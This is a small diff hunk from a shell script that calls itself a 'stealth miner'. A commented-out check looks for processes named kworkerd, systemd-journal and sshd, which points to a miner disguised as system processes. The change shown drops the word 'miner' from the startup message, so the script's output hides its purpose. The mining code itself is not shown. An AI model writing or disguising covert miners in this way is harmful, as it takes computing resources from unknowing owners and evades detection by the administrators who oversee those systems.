@@ -64,4 +64,4 @@ sleep 3
 # If you want to see if it worked, uncomment the next line
 # ps aux | grep -E "(kworkerd|systemd-journal|sshd)" | grep -v grep
 
-echo "Stealth miner started. WS Port: $WS_PORT, TCP Port: $TCP_PORT"
+echo "Stealth started. WS Port: $WS_PORT, TCP Port: $TCP_PORT"
